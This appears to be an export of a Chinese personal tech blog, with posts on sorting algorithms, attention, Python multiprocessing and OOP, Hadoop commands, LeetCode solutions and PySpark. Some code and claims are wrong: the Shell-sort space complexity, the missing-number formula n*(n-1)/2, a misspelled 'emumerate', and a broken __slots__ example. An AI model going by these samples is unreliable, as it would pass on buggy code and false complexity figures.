2.某一轮的结束为止为j，但这一轮最后一次交换发生在lastSwap位置，那么说明lastSwap到j之间已经排好序，下次遍历的结束点就不需要再到j—而是直接到lastSwap即可。 4.希尔排序​ 希尔排序是一种插入排序的改良算法，简单的插入排序不管元素怎么样，都从头到尾一步一步的进行元素比较，如果遇到逆序序列如：[5,4,3,2,1,0]数组末端的0要回到原始位置需要n-1次的比较和移动。而希尔排序使用跳跃式分组的策略，通过某个增量将数组元素划分为若干组，然后在各个组内进行插入排序，随后逐步缩小增量，继续按照组进行排序，直至增量为1。 ​ 希尔排序通过这种策略使的整个数组在初始阶段宏观上基本有序，小的基本在前，大的基本在后，然后缩小增量相当于进行微调，不会过多的设计元素移动。 基本思想：把记录按照下标的一定增量进行分组，对每组使用直接插入排序算法进行排序；随着增量逐渐减少，魅族包含的元素个数越来越多，当增量减至1时，整个文件被分成一组，算法终止。 稳定性：不稳定 平均时间复杂度：O(n^2) 最坏时间复杂度 : O(n^\frac{3}{2}) 空间复杂度:O( n^2 ) 5.快速排序​ 快速排序的的主要思想是先找到一个任意一个元素作为基准元素pivot（一般都采用第一个元素作为基准），然后从右向左搜索，如果发现比pivot小，那么和pivot交换,然后从右向左进行搜索，如果发现比pviot大，那么进行交换，遍历一轮后pivot左边的元素都比它小，右边的元素都比他大，此时pivot的位置就是排好序后他也应该在的位置。然后继续用递归算法分别处理pivot左边的元素和右边的元素。 对于大的乱序数据快速排序被认为是最快速的排序方式123456789101112131415161718192021222324252627282930313233#方式一：递归def quick_sort(arr,l,r): if(l&lt;r): q = mpartition(arr,l,r) quick_sort(arr,l,q-1) #前面经过一次mpartion后q位置已经排好序，因此递归时两部分跳过q位置 quick_sort(arr,q+1,r) return arr def mpartition(arr,l,r): """ 递归子函数，povit放到指定位置 return l:最终标志元素被放置的位置，本轮确定了的元素位置 """ poviot = arr[l] while l&lt;r: while l&lt;r and arr[r]&gt;=poviot: r -= 1 if l&lt;r: arr[l] = arr[r] l += 1 while l&lt;r and arr[l]&lt;poviot: l += 1 if l&lt;r: arr[r] = arr[l] r -= 1 arr[l] = poviot return l 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#方式二：非递归，利用栈def partition(nums,low,high): #确定nums数组中指定部分low元素的位置，左边都比它小，右边都比他大 pivot = nums[low] high_flag = True #这里之所以设置这两个flag是为了确保交叉进行，否则可能会出现最大索引值处没有值或者最大索引值处一直付给各个low low_flag = False while low&lt;high and low&lt;len(nums) and high&lt;len(nums): if high_flag: if nums[high]&lt;pivot: nums[low]=nums[high] high_flag = False low_flag = True else: high -= 1 if low_flag: if nums[low]&gt;pivot: nums[high] = nums[low] low_flag = False high_flag = True else: low += 1 nums[low] = pivot return low def quick_sort(nums): low = 0 high = len(nums)-1 stack = [] #存储每次遍历起始索引和结束索引 if low&lt;high: #先手动将找到第一个节点的最终位置，将原数组分为左右两个数组，分别左右索引入栈 mid = partition(nums,low,high) if low&lt;mid-1: stack.append(low) stack.append(mid-1) if high&gt;mid+1: stack.append(mid+1) stack.append(high) #取出之前入栈的一个数组，来进行确定最终位置，分为左右两个子数组，分别左右索引入栈的操作，重复直到所有元素都已经排好序 while stack: #这里写的是属于右半部都排好后左半部 r = stack.pop() l = stack.pop() mid = partition(nums,l,r) if l&lt;mid-1: stack.append(l) stack.append(mid-1) if r&gt;mid+1: stack.append(mid+1) stack.append(r) return nums 稳定性：不稳定（排序过程中不停地交换元素位置造成了排序算法不稳定） 时间复杂度： ​ 平均时间O(nlogn) ​ 最坏情况：O(n^2) 空间复杂度：O(nlogn) 6.归并排序​ 该算法采用经典的分治（divide-and-conquer）策略（分治法将问题分(divide)成一些小的问题然后递归求解，而治(conquer)的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。 ​ 每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|log2n|。总的平均时间复杂度为O(nlogn)。而且，归并排序的最好，最坏，平均时间复杂度均为O(nlogn)。 1234567891011121314151617181920212223def MergeSort(lists): if len(lists) &lt;= 1: return lists num = int(len(lists) / 2) left = MergeSort(lists[:num]) right = MergeSort(lists[num:]) return Merge(left, right)def Merge(left, right): r, l = 0, 0 result = [] while l &lt; len(left) and r &lt; len(right): if left[l] &lt;= right[r]: result.append(left[l]) l += 1 else: result.append(right[r]) r += 1 result += list(left[l:]) result += list(right[r:]) return result 7.堆排序​ 见堆排序 7.桶排序]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——Attention相关]]></title>
    <url>%2F2019%2F01%2F21%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Attention%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[1.为什么要使用Attention机制？​ Attention机制最初起源于seq2seq中，经典的encoder-decoder做机器翻译时，通常是是使用两个RNN网络，一个用来将待翻译语句进行编码输出一个vector，另一个RNN对上一个RNN网络的输出进行解码，也就是翻译的过程。但是经典的encoder-decoder模式最大的缺点在于：不管输入多么长的语句，最后输出的也只是最后一个vector，这个向量能否有效的表达该语句非常值得怀疑，而Attention机制正是利用了RNN整个过程中的各个输出来综合进行编码 原始序列模型的不足： ​ 1.从编码器到解码器的语境矩阵式大小是固定的，这是个瓶颈问题 ​ 2.难以对长的序列编码，并且难以回忆长期依赖 2.Attention原理1.首先在RNN的过程中保存每个RNN单元的隐藏状态(h1….hn) 2.对于decoder的每一个时刻t，因为此时有decoder的输入和上一时刻的输出，所以我们可以的当前步的隐藏状态St 3.在每个t时刻用St和hi进行点积得到attention score 4.利用softmax函数将attention score转化为概率分布 ​ 利用下面的公式进行概率分布的计算： 5.利用刚才的计算额Attention值对encoder的hi进行加权求和，得到decoder t时刻的注意力向量（也叫上下文向量） ​ 6.最后将注意力向量和decoder t时刻的隐藏状态st并联起来做后续步骤（例如全连接进行分类） 3.Attention计算方式​ 前面一节中，我们的概率分布来自于h与s的点积再做softmax，这只是最基本的方式。在实际中，我们可以有不同的方法来产生这个概率分布，每一种方法都代表了一种具体的Attention机制。在各个attention中，attention的计算方式主要有加法attention和乘法attention两种。 3.1 加法attention​ 在加法attention中我们不在使用st和hi的点乘，而是使用如下计算: ​ 其中,va和Wa都是可以训练的参数。使用这种方式产生的数在送往softmax来进行概率分布计算 3.2 乘法attention​ 在乘法attention中使用h和s做点乘运算: ​ 显然乘法attention的参数更少，计算效率更高。 4.self-attention​ 思想：在没有任何额外信息情况下，句子使用self-attention机制来处理自己，提取关键信息 在attention机制中经常出现的一种叫法： ​ query：在一个时刻不停地要被查询的那个向量（前面的decodert时刻的隐藏状态st）。 ​ key: 要去查询query计算个query相似关度的向量（前面的encoder在各个时刻的隐藏状态hi） ​ value: 和softmax得到的概率分布相乘得到最终attention上下文向量的向量(前面的encoder在各个时刻的隐藏状态hi) 这里我们可以明显知道，任意attention中key和value是相同的 ​ attention就是key、value、和query都来自同一输入的(也是相同的)]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python进阶-面向对象编程]]></title>
    <url>%2F2019%2F01%2F08%2Fpython%E8%BF%9B%E9%98%B6-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[1.__slots__ ​ 用于指定class 实例能够指定的属性 注意：__slots__只对当前类起作用，对其子类无效 12345678910import tracebackclass Myclass(object): __slots__ = ["name","set_name] s = MyClass()s.name = "john" #这里可以进行正常的赋值，因为包含在__slots__中try: s.age = 2 #这里不能进行正常赋值except AttributeError: traceback.print_exc() Output: 2.@property属性 ​ @property 可以实现比较方便的属性set、get设置 1.使用@property相当于讲将一个函数变为get某个属性值2.@属性名称.setter可以实现设置一个属性的set条件 ​ 使用上面的两种修饰符，可以实现 ​ 1.对写入属性的限制，只有符合规范的才允许写入 ​ 2.设置只读属性，只能够读取，不能写入，只能从其他属性处计算出 下面的就是对score属性的写操作进行了一些限制，将double_score属性设置为只读属性 123456789101112131415161718192021222324252627282930313233343536373839404142class MyClass(object): @property def score(self): return self._score @score.setter def score(self,value): #不是int类型时引发异常 if not isinstance(value,int): raise ValueError("not int") #raise的作用是显示的引发异常 #超出范围时引发异常 elif (value&lt;0) or (value&gt;100): raise ValueError("score must in 0 to 100") self._score = value @property def double_score(self): return self._score*2 s = MyClass()s.score = 3print(s.score)try: s.score = 2300except ValueError: traceback.print_exc() try: s.score = "dfsd"except ValueError: traceback.print_exc() print(s.double_score)try: s.double_score = 2except Exception: traceback.print_exc() 描述器，主要是用来读写删除类的行为 函数可以直接使用__name__属性来获取函数名称 1234567def now(): print("2012")print(now.__name__)output: "now" ​]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python进阶-生成器和迭代器]]></title>
    <url>%2F2019%2F01%2F08%2Fpython%E8%BF%9B%E9%98%B6-%E7%94%9F%E6%88%90%E5%99%A8%E5%92%8C%E8%BF%AD%E4%BB%A3%E5%99%A8%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[pythonic程序规范化]]></title>
    <url>%2F2019%2F01%2F07%2Fpythonic%E7%A8%8B%E5%BA%8F%E8%A7%84%E8%8C%83%E5%8C%96%2F</url>
    <content type="text"><![CDATA[1.常量名称全部大写 2.代码长度一行不能超过80字符 3.类名使用驼峰式命名，一般不超过3 4.函数名称]]></content>
  </entry>
  <entry>
    <title><![CDATA[python2和python3的不同点]]></title>
    <url>%2F2019%2F01%2F07%2Fpython2%E5%92%8Cpython3%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9%2F</url>
    <content type="text"><![CDATA[​ 因为系统移植过程中一直出现python3程序向python2转化的问题，因此这里记录下我在程序移植过程中遇到过的坑。 1.python2和python3的url编码解码函数接口 2.python2和python3向文件中写入中文时指定编码方式 ​ 对于python3来说，要在写入文件时指定编码方式是十分简单的，只需要下面的方式即可： 12with open(filename,'a',encoding='utf-8') as f: f.write("中文") ​ 但对于python2，要在写入文件时,手动添加utf-8文件的前缀 123456import sysreload(sys)sys.setdefaultencoding('utf-8')with open(r'd:\sss.txt','w') as f: f.write(unicode("\xEF\xBB\xBF", "utf-8"))#函数将\xEF\xBB\xBF写到文件开头，指示文件为UTF-8编码。 f.write(u'中文') 3.python2和python3外置函数区别 在python3中外置函数文件可以直接进行调用，如在下面的文件结构 12|--main.py tools—— 在python2中外置函数文件目录下必须要有init.py 空文件，否则无法进行加载 12 4.python2和python3文件中中文问题 ​ 在python3中，输出和备注等一切位置都可以直接使用中文，不需要任何额外的代码，在python2中，必须要在包含中文的python文件中加入 1#coding=utf-8 ​ 才能出现中文，否则报错。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pytorch建模基本操作]]></title>
    <url>%2F2019%2F01%2F02%2Fpytorch%E5%BB%BA%E6%A8%A1%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[1.查看模型结构 12]]></content>
  </entry>
  <entry>
    <title><![CDATA[python不显示警告信息设置]]></title>
    <url>%2F2019%2F01%2F02%2Fpython%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%AD%A6%E5%91%8A%E4%BF%A1%E6%81%AF%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在使用python处理多线程或者循环次数较多时，常常会因为系统爆出一些警告信息而影响结果的查看，比如下面的警告： 十分影响美观，造成结果混乱，很难找到有效的信息，下面我们使用python自带的warning设置，设置过滤warn级别的告警 12import warningswarnings.filterwarnings("ignore") 结果变为：]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多进程]]></title>
    <url>%2F2018%2F12%2F30%2Fpython%E5%A4%9A%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[​ python多进程之前一直在在写一些小程序，这次正好需要写一个比较正式的多进行处理，正好系统的总结下python多进行的一些核心知识。 ​ 首先python中常用的提高效率的方式主要主要包括多线程、多进程两种，但是在python中的多线程并不是正正的多线程，只有在网络请求密集型的程序中才能有效的提升效率，在计算密集型、IO密集型都不是很work甚至会造成效率下降，因此提升效率的方式就主要以多进程为主。 ​ python中多进程需要使用python自带包multiprocessing，multiprocessing支持子进程、通信和共享数据、执行不同形式的同步，提供了Process、Queue、Pipe、Lock等组件 1from multiprocessing import Lock,Value,Queue,Pool 创建进程类1.单个进程类的创建​ 1.创建单进程 ​ 12 使用进程池创建多进程​ Pool类可以提供指定数量的进程供用户调用，当有新的请求提交到Pool中时，如果池还没有满，就会创建一个新的进程来执行请求。如果池满，请求就会告知先等待，直到池中有进程结束，才会创建新的进程来执行这些请求。 ​ 常用方法： ​ 1.apply ​ 用于传递不定参数，同python中的apply函数一致，主进程会被阻塞直到函数执行结束（不建议使用，并且3.x以后不在出现）。 ​ 2.apply_async ​ 和apply类似，非阻塞版本，支持结果返回后进行回调 ​ 3.map ​ 函数原型:map(func, iterable[, chunksize=None]) ​ Pool中的map和python内置的map用法基本上一致，会阻塞直到返回结果 ​ 4.map_async ​ 函数原型：map_async(func, iterable[, chunksize[, callback]]) ​ 和map用法一致，但是它是非阻塞的 ​ 5.close ​ 关闭进程池，使其不再接受新的任务 ​ 6.terminal ​ 结束工作进程，不再处理未处理的任务 ​ 7.join ​ 主进程阻塞等待子进程退出，join方法要在close或terminal方法后面使用 ​ 1234from mutiprocess import Poolprocess_nums = 20pool = Pool(process_nums) 使用Lock来避免冲突​ lock主要用于多个进程之间共享资源时，避免资源访问冲突，主要包括下面两个操作： ​ 1.look.acquire() 获得锁 ​ 2.lock.release() 释放锁 ​ 下面是不加锁时的程序： 1234567891011121314151617import multiprocessingimport timedef add(number,value,lock): print ("init add&#123;0&#125; number = &#123;1&#125;".format(value, number)) for i in xrange(1, 6): number += value time.sleep(1) print ("add&#123;0&#125; number = &#123;1&#125;".format(value, number)) if __name__ == "__main__": lock = multiprocessing.Lock() number = 0 p1 = multiprocessing.Process(target=add,args=(number, 1, lock)) p2 = multiprocessing.Process(target=add,args=(number, 3, lock)) p1.start() p2.start() print ("main end") ​ 结果为： 12345678910111213main endinit add1 number = 0init add3 number = 0add1 number = 1add3 number = 3add1 number = 2add3 number = 6add1 number = 3add3 number = 9add1 number = 4add3 number = 12add1 number = 5add3 number = 15 ​ 两个进程交替的来对number进行加操作，下面是加锁后的程序： 1234567891011121314151617181920212223import multiprocessingimport timedef add(number,value,lock): lock.acquire() try: print ("init add&#123;0&#125; number = &#123;1&#125;".format(value, number)) for i in xrange(1, 6): number += value time.sleep(1) print ("add&#123;0&#125; number = &#123;1&#125;".format(value, number)) except Exception as e: raise e finally: lock.release()if __name__ == "__main__": lock = multiprocessing.Lock() number = 0 p1 = multiprocessing.Process(target=add,args=(number, 1, lock)) p2 = multiprocessing.Process(target=add,args=(number, 3, lock)) p1.start() p2.start() print ("main end") ​ 结果为： 1234567891011121314main endinit add1 number = 0 #add1优先抢到锁，优先执行add1 number = 1add1 number = 2add1 number = 3add1 number = 4add1 number = 5init add3 number = 0 #add3被阻塞，等待add1执行完成，释放锁后执行add3add3 number = 3add3 number = 6add3 number = 9add3 number = 12add3 number = 15#注意观察上面add3部分，虽然在add1部分已经将number加到了5，但是由于number变量只是普通变量，不能在各个进程之间进行共享，因此add3开始还要从0开始加 使用Value和Array来进行内存之中的共享通信​ 一般的变量在进程之间是没法进行通讯的，multiprocessing 给我们提供了 Value 和 Array 模块，他们可以在不通的进程中共同使用。 ​ 1.Value多进程共享变量 ​ 将前面加锁的程序中的变量使用multiprocessing提供的共享变量来进行 123456789101112131415161718192021222324import multiprocessingimport timedef add(number,add_value,lock): lock.acquire() try: print ("init add&#123;0&#125; number = &#123;1&#125;".format(add_value, number.value)) for i in xrange(1, 6): number.value += add_value print ("***************add&#123;0&#125; has added***********".format(add_value)) time.sleep(1) print ("add&#123;0&#125; number = &#123;1&#125;".format(add_value, number.value)) except Exception as e: raise e finally: lock.release() if __name__ == "__main__": lock = multiprocessing.Lock() number = multiprocessing.Value('i', 0) p1 = multiprocessing.Process(target=add,args=(number, 1, lock)) p2 = multiprocessing.Process(target=add,args=(number, 3, lock)) p1.start() p2.start() print ("main end") ​ 输出结果为： 123456789101112131415161718192021222324#add3开始时是在add1的基础上来进行加的main endinit add1 number = 0***************add1 has added***********add1 number = 1***************add1 has added***********add1 number = 2***************add1 has added***********add1 number = 3***************add1 has added***********add1 number = 4***************add1 has added***********add1 number = 5init add3 number = 5***************add3 has added***********add3 number = 8***************add3 has added***********add3 number = 11***************add3 has added***********add3 number = 14***************add3 has added***********add3 number = 17***************add3 has added***********add3 number = 20 ​ 2.Array实现多进程共享内存变量 12345678910111213141516171819202122232425262728293031323334import multiprocessingimport timedef add(number,add_value,lock): lock.acquire() try: print ("init add&#123;0&#125; number = &#123;1&#125;".format(add_value, number.value)) for i in xrange(1, 6): number.value += add_value print ("***************add&#123;0&#125; has added***********".format(add_value)) time.sleep(1) print ("add&#123;0&#125; number = &#123;1&#125;".format(add_value, number.value)) except Exception as e: raise e finally: lock.release()def change(arr): for i in range(len(arr)): arr[i] = -arr[i] if __name__ == "__main__": lock = multiprocessing.Lock() number = multiprocessing.Value('i', 0) arr = multiprocessing.Array('i', range(10)) print (arr[:]) p1 = multiprocessing.Process(target=add,args=(number, 1, lock)) p2 = multiprocessing.Process(target=add,args=(number, 3, lock)) p3 = multiprocessing.Process(target=change,args=(arr,)) p1.start() p2.start() p3.start() p3.join() print (arr[:]) print ("main end") ​ 输出结果为： 12345678910111213141516171819202122232425[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]init add3 number = 0***************add3 has added***********[0, -1, -2, -3, -4, -5, -6, -7, -8, -9]main endadd3 number = 3***************add3 has added***********add3 number = 6***************add3 has added***********add3 number = 9***************add3 has added***********add3 number = 12***************add3 has added***********add3 number = 15init add1 number = 15***************add1 has added***********add1 number = 16***************add1 has added***********add1 number = 17***************add1 has added***********add1 number = 18***************add1 has added***********add1 number = 19***************add1 has added***********add1 number = 20 使用Queue来实现多进程之间的数据传递​ Queue是多进程安全队列，可以使用Queue来实现进程之间的数据传递，使用的方式： 1.put 将数据插入到队列中 ​ 包括两个可选参数：blocked和timeout ​ (1)如果blocked为True（默认为True）,并且timeout为正值，该方法会阻塞队列指定时间，直到队列有剩余，如果超时，会抛出Queue.Full ​ (2)如果blocked为False，且队列已满，那么立刻抛出Queue.Full异常 2.get 从队列中读取并删除一个元素 ​ 包括两个可选参数:block和timeout ​ （1）blocked为True，并且timeout为正值，那么在等待时间结束后还没有取到元素，那么会抛出Queue.Empty异常 ​ （2）blocked为False，那么对列为空时直接抛出Queue.Empty异常 python实现多进程最优方式​ python中自带的joblib包自带了]]></content>
      <categories>
        <category>python进阶操作</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hadoop使用]]></title>
    <url>%2F2018%2F12%2F25%2Fhadoop%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1.查看hadoop某个目录下的文件 1sudo hadoop fs -ls path 2.从hdfs上下拉文件到本地 1sudo hdfs fs -get file 3.获取部署在docker中的hadoop的挂载信息等元数据 1sudo docker inspect hdp-server]]></content>
  </entry>
  <entry>
    <title><![CDATA[刷题之Cpp基础知识回顾]]></title>
    <url>%2F2018%2F12%2F24%2F%E5%88%B7%E9%A2%98%E4%B9%8BCpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%2F</url>
    <content type="text"><![CDATA[由于C++已经多 1.动态数组的声明]]></content>
  </entry>
  <entry>
    <title><![CDATA[刷题心得]]></title>
    <url>%2F2018%2F12%2F23%2F%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[1.在只需要考虑是不是存在元素的个数，只可考虑是否存在的情况下，先将list装换成set可以非常有效的提升计算效率 2.对Int类型数值的范围要保持敏感​ Int类型数值范围为 ​ Max 0x7fffffff 2^31-1 2147483647 ​ Min 0x80000000 2^31 -2147483648 ​ 注意：负数的范围会比正数的范围大一，这按需要特别注意 3.常见数学问题要考虑的情况​ 1.是否有负数 ​ 2.是否有小数 ​ 3.是否考虑错误输入？如何进行处理 ​ 4.数据范围极端值 ​ 5.0或空如何进行处理 ​ .]]></content>
  </entry>
  <entry>
    <title><![CDATA[刷题记录]]></title>
    <url>%2F2018%2F12%2F22%2F%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[1.除自身以外的数组乘积给定长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。 示例: 12输入: [1,2,3,4]输出: [24,12,8,6] 说明：不能使用除法，在O(n)时间复杂度内解决此问题 解决思路： ​ 可以使用先从左到右进行遍历，记录每个位置左面的元素相乘获得的值，存储在output的对应位置，再从右到左进行遍历，记录每个位置右侧的元素乘积，再和output中已经存储的该位置左侧的元素乘积相乘，就可以得到最终结果，时间复杂度为O(n) 12345678910111213141516171819202122232425class Solution: def productExceptSelf(self, nums): """ 完美解 :type nums: List[int] :rtype: List[int] """ left = 1 right = 1 len_nums = len(nums) output = [0]*len_nums #从左到右进行一次遍历，在output中对应位置记录该值左面的元素乘积 for i in range(0,len_nums): output[i] = left left = left*nums[i] #从右到左进行一次遍历，记录每个值右面元素的乘积，和output中已经进行存储的左面乘积相乘，得到各个位置最终的结果 for j in range(len_nums-1,-1,-1): output[j] *= right right *= nums[j] return output 2.缺失数字 给定一个包含 0, 1, 2, ..., n 中 n 个数的序列，找出 0 .. n 中没有出现在序列中的那个数。 示例 1: 12输入: [3,0,1]输出: 2 示例 2: 12输入: [9,6,4,2,3,5,7,0,1]输出: 8 说明:你的算法应具有线性时间复杂度。你能否仅使用额外常数空间来实现? 思路一：最常见的思路应该是先排序，然后顺序遍历，对不上则为缺失位置 1234567891011class Solution: def missingNumber(self, nums): """ :type nums: List[int] :rtype: int """ for key,value in emumerate(nums): if key!=value: return key else: return key+1 思路二：另一种比较巧妙地思路就是直接利用数学的方法来解决这个问题，仔细研究题目，我们可以发现题目中所给的nums数组内所有元素的加和可以看做等差数列的加和减去缺失数，因此我们可以直接计算等差数列的加和(n*(n-1))/2，然后减去nums数组的加和，二者相减即为缺失的数. 1234567class Solution: def missingNumber(self, nums): """ :type nums: List[int] :rtype: int """ return (int(len(nums)*(len(nums)-1)/2)- sum(nums)) 爬楼梯问题（动态规划）假设你正在爬楼梯。需要 n 阶你才能到达楼顶。 每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 注意：给定 n 是一个正整数。 示例 1： 12345输入： 2输出： 2解释： 有两种方法可以爬到楼顶。1. 1 阶 + 1 阶2. 2 阶 示例 2： 123456输入： 3输出： 3解释： 有三种方法可以爬到楼顶。1. 1 阶 + 1 阶 + 1 阶2. 1 阶 + 2 阶3. 2 阶 + 1 阶 解题思路：首先经过题目分析我们最自然的可以想到，要想问到第n层楼梯的走法，那么一定为到第n-1和第n-2层楼梯走法之和，因此我们可以清楚地可以看出这是一道递归问题。即n(i) = n(i-1)+n(i-2) 1234567891011121314class Solution(object): def climbStairs(self, n): """ :type n: int :rtype: int """ def f(n): if n==0|n==1: return 1 else: return f(n-1)+f(n-2) if n&gt;=2: return f(n) return 1 转换成非递归问题（其实本质就是讲递归问题由系统储存的信息改为程序储存，从而改编程序的运行方式，提高程序的运行效率） 12345678910class Solution(object): def climbStairs(self, n): """ :type n: int :rtype: int """ way = [0,1,2] for i in range(3,n+1): way.append(way[i-1]+way[i-2]) return way[n]]]></content>
      <categories>
        <category>机试</category>
      </categories>
      <tags>
        <tag>机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自动化部署pyspark程序记录]]></title>
    <url>%2F2018%2F12%2F07%2F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2pyspark%E7%A8%8B%E5%BA%8F%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[​ 项目要求需要在pyspark的集群中将一部分程序做集群的自动化部署，本文记录了程序部署过程中，使用到的一些技术以及遇到的一些问题。 1.SparkSession创建时设置不生效​ 首先，要进行程序的自动化部署首先要将程序封装成python文件，在这个过程中可能会出现sparkSession谁知不能生效的问题，不论对SparkSession进行什么设置，都不会生生效 这种问题是由于SparkSession的创建过程不能写在主程序中，必须要写在所有函数的外层，并且进行的在文件的初始部分穿创建 2.python 文件传入获取参数​ python文件也可以和shell脚本一样进行运行时传入参数，这里主要使用的的是python自带的sys和getopt包 1234567891011要接受参数的python文件：import sysimport getoptopts,args = getopt.getopt(sys.argv[1:],"d:",["d:"])for opt,arg in opts: if opt in ("-d","--d"): input_file = arg#后续可以直接使用input——file获取的变量名进行操作 3.将python文件执行封装到shell脚本中​ 这里之所以将python文件进行封装主要是为了方便移植，其实也可以直接设置将python脚本文件执行设置成定时任务，这里是一波瞎操作。主要为了练习和方便移植 123456789101112#首先在这个shell重要实现获取当前日期或前n天的日期date = `date -d "1 days ago"+%Y-%m-%d`#然后在将date作为参数后台执行这个程序并且生成日志python ***.py -d date &gt; /path/$&#123;date&#125;.log 2&gt;&amp;1 &amp;#=====================注意==============================#上面直接使用python执行时可能会出现系统中存在多个python导致部署时使用的python和之前测试使用的python不是一个python环境导致的，那么如何确定测试时使用的python环境呢？#要解决上述问题可以先从新进入到测试用的python环境，然后进行下面操作import sysprint(sys.execyutable)#然后将python目录改为上面的python目录]]></content>
  </entry>
  <entry>
    <title><![CDATA[深度学习训练基本经验]]></title>
    <url>%2F2018%2F11%2F26%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AE%AD%E7%BB%83%E5%9F%BA%E6%9C%AC%E7%BB%8F%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[1.在各个隐藏层和激活函数之间加入Batch Normalization层可以大大缩短训练时间，而且还存在隐藏效果，比如出现还可以改善效果。 调用： ​ Normalization(num_features) 参数设置： ​ CNN后接Batch Normalization: nums_feeatures为CNN感受野个数(即输出深度) ​ 全连接层后接Batch Normalization：num_features为输出的特征个数 2.Batch Normalization和Dropout层不要一起使用，因为BN以及具备了dropout的效果，一起使用不但起不到效果，而且会产生副作用 常见副作用: ​ 1.只能使用特别小的速率进行训练，使用较大的速率进行训练时，出现梯度消失，无法进行下降 ​ 2.最终与训练集拟合程度不高，例如与训练集的拟合程度只能达到90% 若一定要将dropout和BN一起使用，那么可以采用下面方式： ​ 1.将dropout放在BN后面进行使用 ​ 2.修改Dropout公式(如高斯Dropout)，使其对对方差不那么敏感 总体思路:降低方差偏移 3.深度学习不收敛问题 ​ 1.最常见的原因可能是由于学习速率设置的过大，这种情况一般先准确率不断上升，然后就开始震荡 ​ 2.当训练样本较小，而向量空间较大时，也可能会产生不收敛问题，这种情况一般从一开始就开始震荡，机会没有准确率上升的过程 ​ 3.训练网络问题。当面对的问题比较复杂，而使用的网络较浅时，可能会产生无法收敛问题 ​ 4.数据没有进行归一化。数据输入模型之前如果没有进行归一化，很有可能会产生收敛慢或者无法进行收敛的问题 注意：收敛与否主要是看损失函数是否还在下降，而不是准确率是否还在上升，存在很多情况损失函数在迭代过程中还是在不断地下降，但是准确率基本上处于停滞状态，这种情况也是一种未完全拟合的表现，经过一段时间损失函数的下降后准确率还可能会迎来较大的提升]]></content>
  </entry>
  <entry>
    <title><![CDATA[pyspark-spark.ml.linalg包]]></title>
    <url>%2F2018%2F11%2F21%2Fpyspark-spark-ml-linalg%E5%8C%85%2F</url>
    <content type="text"><![CDATA[pyspark 的pyspark.ml.linalg包主要提供了向量相关(矩阵部分不是很常用因此本文不提)的定义以及计算操作 主体包括： ​ 1.Vector ​ 2.DenseVector ​ 3.SparseVector 1.Vector​ 是下面所有向量类型的父类。我们使用numpy数组进行存储，计算将交给底层的numpy数组。 主要方法： ​ toArray() 将向量转化为numpy的array 2.DenseVector​ 创建时，可以使用list、numpy array、等多种方式进行创建 常用方法： ​ dot() 计算点乘,支持密集向量和numpy array、list、SparseVector、SciPy Sparse相乘 ​ norm() 计算范数 ​ numNonzeros() 计算非零元素个数 ​ squared_distance() 计算两个元素的平方距离 ​ .toArray() 转换为numpy array ​ values 返回一个list 12345678910111213141516171819202122232425262728293031323334#密集矩阵的创建v = Vectors.dense([1.0, 2.0])u = DenseVector([3.0, 4.0])#密集矩阵计算v + uoutput: DenseVector([4.0, 6.0]) #点乘v.dot(v) #密集向量和密集向量之间进行点乘output: 5.0v.dot(numpy.array([1,2])) #使用密集向量直接和numpy array进行计算output: 5.0 #计算非零元素个数DenseVector([1,2,0]).numNonzeros()#计算两个元素之间的平方距离a = DenseVector([0,0])b = DenseVector([3,4])a.squared_distance(b)output: 25.0 #密集矩阵转numpy arrayv = v.toArray()voutput: array([1., 2.]) 3.SparseVector​ 简单的系数向量类，用于将数据输送给ml模型。 ​ Sparkvector和一般的scipy稀疏向量不太一样，其表示方式为，（数据总维数，该数据第n维存在值列表，各个位置对应的值列表） 常用方法： ​ dot() SparseVector的点乘不仅可以在SparseVector之间还可以与numpy array相乘 ​ indices 有值的条目对应的索引列表，返回值为numpy array ​ size 向量维度 ​ norm() 计算范数 ​ numNonzeros() 计算非零元素个数 ​ squared_distance() 计算两个元素的平方距离 ​ .toArray() 转换为numpy array ​ values 返回一个list 注：加粗部分为SparseVector特有的 